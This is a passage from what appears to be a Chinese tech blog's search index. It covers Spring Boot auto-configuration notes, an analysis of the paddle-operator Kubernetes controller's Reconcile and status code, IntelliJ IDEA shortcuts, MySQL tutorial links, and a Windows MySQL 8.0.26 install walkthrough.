将与定义它们的方法的名称相同）。\n与基于 XML 的配置相比，基于 Java 的配置具有多个优点，包括更高的类型安全性和改进的可重构性。即使这样，仅当 Spring 无法自动配置组件时，才需要使用 Java 或 XML 进行显式配置。\n自动配置起源于 Spring 技术，即 自动装配 和 组件扫描。借助组件扫描，Spring 可以自动从应用程序的类路径中发现组件，并将其创建为 Spring 应用程序上下文中的 bean。通过自动装配，Spring 会自动将组件与它们依赖的其他 bean 一起注入。\n最近，随着 Spring Boot 的推出，自动配置的优势已经远远超出了组件扫描和自动装配。Spring Boot 是 Spring 框架的扩展，它提供了多项生产力增强功能。这些增强功能中最著名的就是 自动配置，在这种配置中，Spring Boot 可以根据类路径中的条目、环境变量和其他因素，合理地猜测需要配置哪些组件，并将它们连接在一起。\n这里想要展示一些演示自动配置的示例代码，但是并没有这样的代码，自动配置就如同风一样，可以看到它的效果，但是没有代码可以展示。我可以说 “看！这是自动配置的示例！” 事情发生、组件启用并且提供了功能，而无需编写代码。缺少代码是自动配置必不可少的要素，这使它如此出色。\nSpring Boot 自动配置大大减少了构建应用程序所需的显式配置（无论是 XML 还是 Java）的数量。实际上，当完成本章中的示例时，将拥有一个正在运行的 Spring 应用程序，该应用程序仅包含一行 Spring 配置代码！\nSpring Boot 极大地增强了 Spring 开发的能力，很难想象没有它如何开发 Spring 应用程序。因此，本书将 Spring 和 Spring Boot 视为一模一样。我们将尽可能使用 Spring Boot，并仅在必要时使用显式配置。而且，由于 Spring XML 配置是使用 Spring 的老派方式，因此我们将主要关注基于 Java 的 Spring 配置。\n","permalink":"http://bingerambo.com/posts/2021/11/spring-%E5%AE%9E%E6%88%98%E7%AC%AC-5-%E7%89%88/","tags":["Java"],"title":"Spring 实战(第 5 版)"},{"categories":["K8S"],"contents":"operator实际上就是控制器，核心逻辑是Reconcile\npaddle operator是在\u0026quot;sigs.k8s.io/controller-runtime\u0026quot;基础上实现的控制器\n源码版本： v0.3.0\n源码地址：https://github.com/PaddleFlow/paddle-operator\nReconcile Reconcile实现，将用户在对象中指定的状态与实际群集状态进行比较，然后执行操作，使实际群集状态反映用户指定的状态。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  // Request contains the information necessary to reconcile a Kubernetes object. This includes the // information to uniquely identify the object - its Name and Namespace. It does NOT contain information about // any specific Event or the object contents itself. type Request struct { // NamespacedName is the name and namespace of the object to reconcile.  types.NamespacedName } // Result contains the result of a Reconciler invocation. type Result struct { // Requeue tells the Controller to requeue the reconcile key. Defaults to false.  Requeue bool // RequeueAfter if greater than 0, tells the Controller to requeue the reconcile key after the Duration.  // Implies that Requeue is true, there is no need to set Requeue to true at the same time as RequeueAfter.  RequeueAfter time.Duration } /* Reconciler implements a Kubernetes API for a specific Resource by Creating, Updating or Deleting Kubernetes objects, or by making changes to systems external to the cluster (e.g. cloudproviders, github, etc). reconcile implementations compare the state specified in an object by a user against the actual cluster state, and then perform operations to make the actual cluster state reflect the state specified by the user. Typically, reconcile is triggered by a Controller in response to cluster Events (e.g. Creating, Updating, Deleting Kubernetes objects) or external Events (GitHub Webhooks, polling external sources, etc). Example reconcile Logic: * Read an object and all the Pods it owns. * Observe that the object spec specifies 5 replicas but actual cluster contains only 1 Pod replica. * Create 4 Pods and set their OwnerReferences to the object. reconcile may be implemented as either a type: type reconcile struct {} func (reconcile) reconcile(controller.Request) (controller.Result, error) { // Implement business logic of reading and writing objects here return controller.Result{}, nil } Or as a function: controller.Func(func(o controller.Request) (controller.Result, error) { // Implement business logic of reading and writing objects here return controller.Result{}, nil }) Reconciliation is level-based, meaning action isn\u0026#39;t driven off changes in individual Events, but instead is driven by actual cluster state read from the apiserver or a local cache. For example if responding to a Pod Delete Event, the Request won\u0026#39;t contain that a Pod was deleted, instead the reconcile function observes this when reading the cluster state and seeing the Pod as missing. */ type Reconciler interface { // Reconciler performs a full reconciliation for the object referred to by the Request.  // The Controller will requeue the Request to be processed again if an error is non-nil or  // Result.Requeue is true, otherwise upon completion it will remove the work from the queue.  Reconcile(context.Context, Request) (Result, error) }   Reconcile实现 Reconcile函数处理逻辑简化如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  func (r *PaddleJobReconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) { // 1 获取PaddleJob资源对象pdj  r.Get(ctx, req.NamespacedName, \u0026amp;pdj) // pdj 的finalize处理  // 2 获取该PaddleJob资源pdj对象关联的pod资源列表  r.List(ctx, \u0026amp;childPods, client.InNamespace(req.Namespace), client.MatchingFields{ctrlRefKey: req.Name}) // 3 根据最新的pods状态，来同步更新pdj的状态  r.syncCurrentStatus(ctx, \u0026amp;pdj, childPods) // 4 删除不需要的pod，如pod的副本数 \u0026gt; pdj.GetSpecs定义的数量  r.deleteResource(ctx, \u0026amp;pdj, \u0026amp;childPods.Items[i]) // 5 如果 pdj.Spec.Intranet == pdv1.Service，为pdj关联的每个pod 创建 svc  // 6 按策略清理删除Failed和Completed状态的pod和svc  cleanOne() // 7 根据pdj.GetStatuses和pdj.GetSpecs的比较判断，进行pod创建  createPod(res, i) // constructPod  // 8 当未设置Spec.Elastic，需等待pdj的所有pod全部运行（应该是ready）起来后，再为该pdj创建configmap  // Create configmap of global env for all pods after all pods are running  // 说明： 这里isAllPodsReady准确的含义如下  // Since the ip or alternative information of pods are collected to the configmap, the configmap will be created after the pods allocated but the pods will not running until configmap ready.  // 还要保证所有pod的ip已分配，即pod.Status.PodIP，才能为该pdj创建configmap  if pdj.Spec.Elastic == nil \u0026amp;\u0026amp; isAllPodsReady(\u0026amp;pdj) { cm := constructConfigMap(\u0026amp;pdj, childPods) r.createResource(ctx, \u0026amp;pdj, cm) } }   syncCurrentStatus 同步更新pdj.Status\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  // 根据最新的pods状态，来同步更新pdj的状态 func (r *PaddleJobReconciler) syncCurrentStatus(ctx context.Context, pdj *pdv1.PaddleJob, childPods corev1.PodList) { syncStatusByPod := func(ss *pdv1.ResourceStatus, pod *corev1.Pod) { if pod.CreationTimestamp.Before(\u0026amp;pdj.CreationTimestamp) { return } // pod status -\u0026gt; pdj status的映射转换  switch pod.Status.Phase { case corev1.PodPending: ss.Pending++ case corev1.PodRunning: // 进一步检查pod中的容器状态是否ready和running  if isPodRealRuning(pod) { ss.Running++ } else { // 此时pod中的容器尚未全部起来  ss.Starting++ } case corev1.PodFailed: ss.Failed++ case corev1.PodSucceeded: ss.Succeeded++ } pref, err := ref.GetReference(r.Scheme, pod) if err != nil { return } // 更新pdj status的refs  ss.Refs = append(ss.Refs, *pref) } pdj.Status = pdv1.PaddleJobStatus{ Phase: getPaddleJobPhase(pdj), Mode: getPaddleJobMode(pdj), StartTime: getPaddleJobStartTime(pdj), CompletionTime: getPaddleJobCompleteTime(pdj), } statuses := map[string]*pdv1.ResourceStatus{} for i, pod := range childPods.Items { resType := pod.Annotations[pdv1.ResourceAnnotation] if statuses[resType] == nil { statuses[resType] = \u0026amp;pdv1.ResourceStatus{} } syncStatusByPod(statuses[resType], \u0026amp;childPods.Items[i]) } for resType, status := range statuses { pdj.SetStatus(resType, status) } } func (pdj *PaddleJob) SetStatus(resType string, status *ResourceStatus) { switch resType { case ResourcePS: pdj.Status.PS = status case ResourceWorker: pdj.Status.Worker = status case ResourceHeter: pdj.Status.Heter = status } }   help func pdj的状态判断函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  func isAllPodsReady(pdj *pdv1.PaddleJob) bool { specs := pdj.GetSpecs() statuses := pdj.GetStatuses() for k, _ := range specs { if !isPodReady(specs[k], statuses[k]) { return false } } return true } func isPodReady(spec *pdv1.ResourceSpec, status *pdv1.ResourceStatus) bool { if spec == nil { return true } if status != nil \u0026amp;\u0026amp; len(status.Refs) == spec.Replicas { return true } return false } func isFailed(status *pdv1.ResourceStatus) bool { return status != nil \u0026amp;\u0026amp; status.Failed \u0026gt; 0 } func isPending(status *pdv1.ResourceStatus) bool { return status != nil \u0026amp;\u0026amp; status.Pending \u0026gt; 0 } func isStarting(status *pdv1.ResourceStatus) bool { return status != nil \u0026amp;\u0026amp; status.Starting \u0026gt; 0 } func isRunning(spec *pdv1.ResourceSpec, status *pdv1.ResourceStatus) bool { return spec == nil || (status != nil \u0026amp;\u0026amp; spec.Replicas == status.Running) } func isCompleted(spec *pdv1.ResourceSpec, status *pdv1.ResourceStatus) bool { return spec == nil || (status != nil \u0026amp;\u0026amp; spec.Replicas == status.Succeeded) }   configmap构造 pod构造 operator 会给pod自动注入一些配置字段，如configmap\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77  func constructPod(pdj *pdv1.PaddleJob, resType string, idx int) (pod *corev1.Pod) { // ...  envIP := corev1.EnvVar{ Name: \u0026#34;POD_IP\u0026#34;, } if pdj.Spec.Intranet == pdv1.Service { envIP.Value = name } else { envIP.ValueFrom = \u0026amp;corev1.EnvVarSource{ FieldRef: \u0026amp;corev1.ObjectFieldSelector{ FieldPath: \u0026#34;status.podIP\u0026#34;, }, } } envRank := corev1.EnvVar{ Name: \u0026#34;PADDLE_TRAINER_ID\u0026#34;, Value: fmt.Sprintf(\u0026#34;%d\u0026#34;, idx), } envRole := corev1.EnvVar{ Name: \u0026#34;TRAINING_ROLE\u0026#34;, Value: pdv1.TrainingRole[resType], } envRole2 := corev1.EnvVar{ Name: \u0026#34;PADDLE_TRAINING_ROLE\u0026#34;, Value: pdv1.TrainingRole[resType], } pod.Spec.Containers[0].Env = append(pod.Spec.Containers[0].Env, envIP, envRank, envRole, envRole2) // pod字段 按下面2种场景区别设置  // 场景1. pdj.Spec.Elastic时，pod无需使用pdj的configmap  if pdj.Spec.Elastic != nil { envJobID := corev1.EnvVar{ Name: \u0026#34;PADDLE_ELASTIC_JOB_ID\u0026#34;, Value: fmt.Sprintf(\u0026#34;%s-%s\u0026#34;, pdj.Namespace, pdj.Name), } envNP := corev1.EnvVar{ Name: \u0026#34;PADDLE_ELASTIC_NP\u0026#34;, Value: fmt.Sprintf(\u0026#34;%d\u0026#34;, pdj.Spec.Worker.Replicas), } envTimeout := corev1.EnvVar{ Name: \u0026#34;PADDLE_ELASTIC_TIMEOUT\u0026#34;, Value: \u0026#34;60\u0026#34;, } pod.Spec.Containers[0].Env = append(pod.Spec.Containers[0].Env, envJobID, envNP, envTimeout) } else { // 场景2. 无pdj.Spec.Elastic时，pod的Containers需要使用pdj构造好的configmap  envF := corev1.EnvFromSource{ ConfigMapRef: \u0026amp;corev1.ConfigMapEnvSource{ LocalObjectReference: corev1.LocalObjectReference{ Name: pdj.Name, }, }, } pod.Spec.Containers[0].EnvFrom = append(pod.Spec.Containers[0].EnvFrom, envF) } if pdj.Spec.Intranet == pdv1.Service { // 给容器添加端口PADDLE_PORT 2379  pod.Spec.Containers[0].Ports = append(pod.Spec.Containers[0].Ports, corev1.ContainerPort{ContainerPort: PADDLE_PORT}) } else if pdj.Spec.Intranet == pdv1.HostNetwork { pod.Spec.HostNetwork = true } // 配置pod RestartPolicy  if pdj.Spec.Elastic != nil { pod.Spec.RestartPolicy = \u0026#34;OnFailure\u0026#34; } else if pod.Spec.RestartPolicy == \u0026#34;\u0026#34; { if resType == pdv1.ResourceWorker \u0026amp;\u0026amp; pdj.Spec.Intranet == pdv1.Service { pod.Spec.RestartPolicy = \u0026#34;OnFailure\u0026#34; } else { pod.Spec.RestartPolicy = \u0026#34;Never\u0026#34; } } return pod }   状态图 paddle job状态图，如下：\n说明：\n operator目前处理使用的 padddle job状态有：  Pending Starting Running Completed Failed   Pending为初态 Failed和Completed是终态 operator对pod 真正Running判断成立条件：pod的status和其所有容器的status都是running，且容器ready Starting是operator的paddle job自定义状态ResourceStatus.Starting:，从k8s Running pod进一步处理得出：  对Running pod进行了细分，表示pod是否RealRunning，即pod中的容器是否ready    其它 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108  // PaddleJob status type ResourceStatus struct { // Pending  Pending int `json:\u0026#34;pending,omitempty\u0026#34;` // Starting  Starting int `json:\u0026#34;starting,omitempty\u0026#34;` // Running  Running int `json:\u0026#34;running,omitempty\u0026#34;` // Failed  Failed int `json:\u0026#34;failed,omitempty\u0026#34;` // Success  Succeeded int `json:\u0026#34;succeeded,omitempty\u0026#34;` // Unknown  Unknown int `json:\u0026#34;unknown,omitempty\u0026#34;` // A list of pointer to pods  Refs []corev1.ObjectReference `json:\u0026#34;refs,omitempty\u0026#34;` } func (pdj *PaddleJob) GetSpecs() map[string]*ResourceSpec { return map[string]*ResourceSpec{ ResourcePS: pdj.Spec.PS, ResourceWorker: pdj.Spec.Worker, ResourceHeter: pdj.Spec.Heter, } } func (pdj *PaddleJob) GetStatuses() map[string]*ResourceStatus { return map[string]*ResourceStatus{ ResourcePS: pdj.Status.PS, ResourceWorker: pdj.Status.Worker, ResourceHeter: pdj.Status.Heter, } } //----------------------------- //----------------------------- // pdj的一些状态设置函数 //----------------------------- //----------------------------- func getPaddleJobPhase(pdj *pdv1.PaddleJob) pdv1.PaddleJobPhase { // final phase won\u0026#39;t change any more  if pdj.Status.Phase == pdv1.Completed { return pdv1.Completed } else if pdj.Status.Phase == pdv1.Failed { return pdv1.Failed } specs := pdj.GetSpecs() statuses := pdj.GetStatuses() for _, status := range statuses { if isFailed(status) { return pdv1.Failed } else if isPending(status) { return pdv1.Pending } else if isStarting(status) { return pdv1.Starting } } checkAll := func(check func(spec *pdv1.ResourceSpec, status *pdv1.ResourceStatus) bool) bool { for k, _ := range statuses { if !check(specs[k], statuses[k]) { return false } } return true } if checkAll(isRunning) { return pdv1.Running } if checkAll(isCompleted) { return pdv1.Completed } if pdj.Status.Phase == \u0026#34;\u0026#34; { return pdv1.Pending } return pdj.Status.Phase } func getPaddleJobStartTime(pdj *pdv1.PaddleJob) *metav1.Time { if pdj.Status.StartTime.IsZero() \u0026amp;\u0026amp; pdj.Status.Phase == pdv1.Running { tmp := metav1.Now() return \u0026amp;tmp } return pdj.Status.StartTime } func getPaddleJobCompleteTime(pdj *pdv1.PaddleJob) *metav1.Time { if pdj.Status.CompletionTime.IsZero() \u0026amp;\u0026amp; (pdj.Status.Phase == pdv1.Completed || pdj.Status.Phase == pdv1.Failed) { tmp := metav1.Now() return \u0026amp;tmp } return pdj.Status.CompletionTime } func getPaddleJobMode(pdj *pdv1.PaddleJob) pdv1.PaddleJobMode { if pdj.Spec.PS != nil { return pdv1.PaddleJobModePS } else if pdj.Spec.Worker != nil \u0026amp;\u0026amp; pdj.Spec.Worker.Replicas \u0026gt; 1 { return pdv1.PaddleJobModeCollective } else { return pdv1.PaddleJobModeSingle } }   ","permalink":"http://bingerambo.com/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/","tags":["K8S"],"title":"paddle-operator分析"},{"categories":["软件"],"contents":"掌握了这些IDEA快捷键基本上可以告别鼠标了。\n📚spring-in-action-v5J IDEA快捷键文档\n1.IDEA提高效率的快捷键 Ctrl+N 快速打开任何类文件.\nCtrl+Shift+N 快速打开任何文件.\nCtrl+Shift+F12 最大化代码窗口和最小化代码窗口来回切换.\nCtrl+Space 代码自动补全\nAlt+F7 查找光标所位置的类、方法、变量，在整个项目中使用特定类、方法或变量的所有位置。\nCrtl+P 快速查看在编辑器的光标处使用的类或方法的文档。\n2.IDEA编辑快捷键 Ctrl+Space 基本代码补全，包括任何类，任何方法，任何变量。\nCtrl+Shift+Space 智能代码补全(按预期类型筛选方法和变量列表)\nCtrl+Shift+Enter 完整的语句\nCtrl+P 查看方法参数信息\nCtrl+Q 快速查找文档\nShift+F1 IDEA的外部文档\nCtrl+ mouse 查看代码的信息\nCtrl+F1 显示错误或警告的描述\nAlt+Insert 生成代码，包含：Getters, Setters, Constructors, hashCode/equals, toString\nCtrl+O 覆盖方法\nCtrl+I 实现接口中的方法\nCtrl+Alt+T 选择条件语句 (if..else, try..catch, for, synchronized, etc.)\nCtrl+/ 用行注释注释/取消注释\nCtrl+Shift+/ 块注释/取消注释\nCtrl+W 选择代码块，每按一次则不断像外扩张\nCtrl+Shift+W 与上面相对应，不断缩小选择范围。\nAlt+Q 上下文信息\nAlt+Enter 显示意图、行动和快速修复\nCtrl+Alt+L 重新格式化代码\nCtrl+Alt+O 优化imports\nCtrl+Alt+I 自动缩进\nTab/Shift+Tab 缩进或者取消缩进已选择的行\nCtrl+X/Shift+Delete 将当前行或选定块剪切到剪贴板\nCtrl+C/Ctrl+Insert 将当前行或选定的块复制到剪贴板\nCtrl+V/Shift+Insert 从剪贴板粘贴\nCtrl+Shift+V 从最近的缓冲区粘贴。\nCtrl+D 重复当前行或选定块\nCtrl+Y 删除光标所在的行\nCtrl+Shift+J 智能合并\nCtrl+Enter 智能拆分\nShift+Enter 新的行\nCtrl+Shift+U 为光标或选定块的单词切换大小写\nCtrl+Shift+]/[ 选择till代码块结束/开始\nCtrl+Del 删除光标后的字符串，会自动判断。\nCtrl+backspace 快速向前删除，会自动判断。\nCtrl+ 加号/减号 展开/折叠代码块\nCtrl+Shift+加号/减号 展开所有/折叠所有代码块\nCtrl+F4 关闭活动编辑器选项卡\nAlt+F7/Ctrl+F7 查找在哪里使用/查找文件中的在哪里使用\nCtrl+Shift+F7 高亮显示文件用到的地方，例如变量、方法\nCtrl+Alt+F7 显示用到的地方\nF5 复制\nF6 移动\nAlt+Delete 安全删除\nShift+F6 重命名文件\nCtrl+F6 更改签名\nCtrl+Alt+N Inline\nCtrl+Alt+M 提取方法\nCtrl+Alt+V 提取变量\nCtrl+Alt+F 提取字段\nCtrl+Alt+C 提取常量\nCtrl+Alt+P 提取参数\n3.IDEA搜索和替换快捷键 双击Shift 在整个项目中搜索文本、文件\nCtrl+F 当前文件查找\nF3/Shift+F3 查找下一个或者上一个\nCtrl+R 替换当前文件的某个字段\nCtrl+Shift+F 在项目中查找文本\nCtrl+Shift+R 在项目中替换文本\n4. IDEA编译和运行快捷键 Ctrl+F9 Make项目(编译修改和依赖)\nCtrl+Shift+F9 编译选定的文件、包或模块\nAlt+Shift+F10 选择配置并运行\nAlt+Shift+F9 选择配置和调试\nShift+F10 运行\nShift+F9 Debug\nCtrl+Shift+F10 从编辑器运行上下文配置\n5.IDEA debug调试快捷键 Ctrl+K Commit项目到VCS\nCtrl+T 从VCS更新项目\nAlt+Shift+C 查看最近的更改\nAlt+` 快速弹出VCS\nF8 步出\nF7 步进\nShift+F7 智能步进\nShift+F8 智能步出\nAlt+F9 定位到光标地方\nAlt+F8 计算表达式\nF9 回复程序\nCtrl+F8 切换断点\nCtrl+Shift+F8 查看断点\n6.IDEA实时代码模板快捷键快捷键 Ctrl+Alt+J 环绕活动模板\nCtrl+J 插入实时代码模板\nCtrl+J - iter 按照Java SDK 1.5的风格进行迭代\nCtrl+J - inst 用instanceof检查对象类型并向下转换它\nCtrl+J - itco Iterate Collection /迭代java.util.Collection的元素\nCtrl+J - itit Iterate Itterator / IIterate elements of java.util.Iterator\nCtrl+J - itli Iterate List /迭代java.util.List的元素\nCtrl+J - psf Public static final\nCtrl+J - thr throw new\n7.IDEA导航快捷键 Ctrl+N 搜索类\nCtrl+Shift+N 搜索文件\nCtrl+Alt+Shift+N 搜索符号，不知道怎么用\nAlt+ Right/Left 转到下一个/上一个编辑器选项卡\nF12 回到上一个工具窗口\nEsc 进入编辑器(从工具窗口)\nShift+Esc 隐藏活动窗口或上次活动窗口\nCtrl+Shift+F4 关闭活动运行/信息/查找/…的选项卡\nCtrl+G Go to line\nCtrl+E 最近文件弹出\nCtrl+Alt+Arrow 左/箭头向右向后/向前导航\nCtrl+Shift+Backspace 导航到最后一个编辑位置\nAlt+F1 在任何视图中选择当前文件或符号\nCtrl+B/Ctrl+ 点击去声明\nCtrl+Alt+B 去实现\nCtrl+Shift+I 打开快速定义查找\nCtrl+Shift+B 转到类型声明\nCtrl+U 父类方法/超类\nAlt+Arrow 向上/向下转到上一个/下一个方法\nCtrl+]/[ 移动到代码块结束、移动到代码块开始\nCtrl+F12 弹出文件结构\nCtrl+H 类型层次结构\nCtrl+Shift+H 方法层次结构\nCtrl+Alt+H 调用层次结构\nF2/Shift+F2 上一个高亮的错误/下一个高亮错误\nF4/Ctrl+Enter 编辑资源/查看资源\nAlt+Home 显示导航栏\nF11 切换书签\nCtrl+F11 切换书签与助记符\nCtrl+0\u0026hellip;9 定位书签\nShift+F11 显卡书签\n8. IDEA常用快捷键 Alt+0\u0026hellip;9 打开相应的工具窗口\nCtrl+S 保存所有\nCtrl+Alt+Y 同步\nCtrl+Shift+F12 最大化切换编辑器\nAlt+Shift+F 添加到收藏夹”\nAlt+Shift+I 用当前配置文件检查当前文件\nCtrl+` 快速切换当前方案\nCtrl+Alt+S 打开设置对话框\nCtrl+Alt+Shift+S 打开项目结构对话框\nCtrl+Shift+A Find Action\nCtrl+Tab 在选项卡和工具窗口之间切换\nCtrl+Shift+Alt+Insert 创建新的划痕文件\n9. IDEA多处选择快捷键 Alt+Shift+点击鼠标 添加或者删除一个选择\nAlt+J 选择下一个事件\nShift+Alt+J 取消选择下一个事件\nShift+Ctrl+Alt+J 选择所有事件\nEsc 取消所有选择\n以上就是IDEA所有的快捷键的全部内容。喜欢可以收藏，忘了可以查询。\n","permalink":"http://bingerambo.com/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/","tags":["软件"],"title":"IDEA常用快捷键汇总"},{"categories":["数据库"],"contents":"备注：非本人原创，本人在学习 MySQL 过程中发现这个网站 http://www.yiibai.com 的 MySQL 教程挺好的，只是排版混乱，无法快速查阅，于是重新排版，方便查看。\n在线阅读，请点击：https://legacy.gitbook.com/book/necan/mysql-tutorial/details\ngithub：\n https://github.com/necan/MySQL-Tutorial  开发人员的 MySQL 教程 如果你是一个寻找学习 MySQL 的 web 开发人员，在本节中，您可立即开始学习使用 MySQL，并学习如何有效地使用 MySQL来更有效地完成您的工作。\n如果您浏览整个教程，了解如何使用如 SQL 查询，MySQL 存储过程，数据库视图，触发器等各种技术来管理 MySQL 数据库和操作数据。\n第一章 基础教程  本节将帮助您熟悉基本的 MySQL 知识，包括使用各种 SQL 语句(如INSERT，DELETE，UPDATE和SELECT)来管理 MySQL 数据库和操作数据。还将了解高级数据查询技术，包括INNER JOIN，LEFT JOIN，子查询，UNION等。 参考阅读：http://www.yiibai.com/mysql/basic-mysql.html  第二章 常用技巧  本节将提供一些高级的 MySQL 技术和技巧，以帮助您有效解决 MySQL 中遇到的一些棘手的问题。 参考阅读：http://www.yiibai.com/mysql/mysqltips.html  第三章 存储过程  在本节中，您将学习如何在 MySQL 中创建存储过程，并通过明确的说明和示例演示如何使用存储过程。 参考阅读：http://www.yiibai.com/mysql/stored-procedure.html  第四章 触发器  MySQL 触发器是自动执行以响应与表相关联的特定事件的存储程序，例如插入，更新或删除记录。 本节介绍如何使用 MySQL 数据库触发器。 参考阅读：http://www.yiibai.com/mysql/triggers.html  第五章 视图  在本节中，您将了解数据库视图，如何创建数据库视图并在 MySQL 中进行管理。 参考阅读：http://www.yiibai.com/mysql/views.html  第六章 全文搜索  在本节中，演示如何使用 MySQL 全文搜索与各种全文搜索技术，如自然语言搜索，布尔语言搜索和查询扩展。 参考阅读：http://www.yiibai.com/mysql/full-text-search.html  第七章 MySQL 函数 本节提供最常用的 MySQL 函数，包括聚合函数，字符串函数，日期和时间函数以及控制流函数使用和示例。 参考阅读：http://www.yiibai.com/mysql/functions.html\n数据库管理员的 MySQL 教程 这个分步教程为您提供了有关 MySQL 管理更深层次的信息。 这里涵盖了从基础到高级 MySQL 管理和配置的一切知识。本节中介绍的所有 MySQL 管理教程都是很实用的，您可在企业生产环境中应用(使用)。\n第八章 MySQL 管理 在本节中，您将找到许多有用的 MySQL 管理教程，包括 MySQL 服务器启动和关闭，MySQL 服务器安全性，MySQL 数据库维护，备份和复制。 参考阅读：http://www.yiibai.com/mysql/administration.html\n","permalink":"http://bingerambo.com/posts/2021/10/mysql%E6%95%99%E7%A8%8B/","tags":["MySQL"],"title":"MySQL教程"},{"categories":["数据库"],"contents":"Windows环境中，MySQL数据库安装配置\nmysql数据库下载地址： https://dev.mysql.com/downloads/mysql/\n下载版本：MySQL Community Server 8.0.26\n安装mysql  解压mysql文件到#D:\\Program Files (x86)\\ 把D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin 添加为环境变量 创建mysql的data目录，如：D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\\Data 编辑mysql服务配置文件my.ini，文件路径为D:\\Program Files (x86)\\mysql-8.0.26-winx64\\my.ini 以系统管理员身份 运行cmd  mysql配置文件my.ini 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  [mysqld]# 设置3306端口port=3306# 设置mysql的安装目录basedir=D:\\\\Program Files (x86)\\\\mysql-8.0.26-winx64# 设置mysql数据库的数据的存放目录datadir=D:\\\\Program Files (x86)\\\\mysql-8.0.26-winx64\\Data # 允许最大连接数max_connections=200# 允许连接失败的次数。max_connect_errors=10# 服务端使用的字符集默认为utf8mb4character-set-server=utf8mb4# 创建新表时将使用的默认存储引擎default-storage-engine=INNODB# 默认使用“mysql_native_password”插件认证#mysql_native_passworddefault_authentication_plugin=mysql_native_password[mysql]# 设置mysql客户端默认字符集default-character-set=utf8mb4[client]# 设置mysql客户端连接服务端时默认使用的端口port=3306default-character-set=utf8mb4  以系统管理员身份 运行cmd\nC:\\Windows\\System32\\cmd.exe\n注意：执行shell命令使用cmd，不要使用git shell\n部署mysql服务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  #D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin #mysqld --initialize-insecure --console # mysql 初始化，并记录初始密码 mysqld --initialize --console mysqld -install net start mysql # mysql -u root -p 或 mysql -h localhost -u root -P 3306 -p \u0026#39;初始密码\u0026#39; # 输入初始密码登录 mysql -u root -p # 修改密码 ALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;111111\u0026#39;;   停止mysql服务 1 2 3  net stop mysql mysqld -remove # 如果需要重新初始化配置mysql服务 initialize，要删除mysql的data目录，   windows查看mysql端口和pid\n1 2 3  netstat -aon|findstr \u0026#34;3306\u0026#34; tasklist|findstr \u0026#34;mysqld\u0026#34;   命令过程信息 mysqld \u0026ndash;initialize \u0026ndash;console 命令会显示 mysql的初始密码：Lak/O0:6CZqB\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  \\mysql-8.0.26-winx64\\bin\u0026gt;mysqld --initialize --console 2021-10-19T03:23:05.874376Z 0 [System] [MY-013169] [Server] D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\\mysqld.exe (mysqld 8.0.26) initializing of server in progress as process 24480 2021-10-19T03:23:05.876211Z 0 [ERROR] [MY-010457] [Server] --initialize specified but the data directory has files in it. Aborting. 2021-10-19T03:23:05.876221Z 0 [ERROR] [MY-013236] [Server] The designated data directory D:\\Program Files (x86)\\mysql-8.0.26-winx64\\Data\\ is unusable. You can remove all files that the server added to it. 2021-10-19T03:23:05.888862Z 0 [ERROR] [MY-010119] [Server] Aborting 2021-10-19T03:23:05.891047Z 0 [System] [MY-010910] [Server] D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\\mysqld.exe: Shutdown complete (mysqld 8.0.26) MySQL Community Server - GPL. mysqld --initialize --console 2021-10-19T03:23:40.722085Z 0 [System] [MY-013169] [Server] D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\\mysqld.exe (mysqld 8.0.26) initializing of server in progress as process 26564 2021-10-19T03:23:40.752086Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started. 2021-10-19T03:23:41.325011Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended. 2021-10-19T03:23:42.762468Z 0 [Warning] [MY-013746] [Server] A deprecated TLS version TLSv1 is enabled for channel mysql_main 2021-10-19T03:23:42.766289Z 0 [Warning] [MY-013746] [Server] A deprecated TLS version TLSv1.1 is enabled for channel mysql_main 2021-10-19T03:23:43.005898Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: Lak/O0:6CZqB   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  \\mysql-8.0.26-winx64\\bin\u0026gt;netstat -aon|findstr \u0026#34;3306\u0026#34; TCP 0.0.0.0:3306 0.0.0.0:0 LISTENING 24032 TCP 0.0.0.0:33060 0.0.0.0:0 LISTENING 24032 TCP 127.0.0.1:3306 127.0.0.1:51668 ESTABLISHED 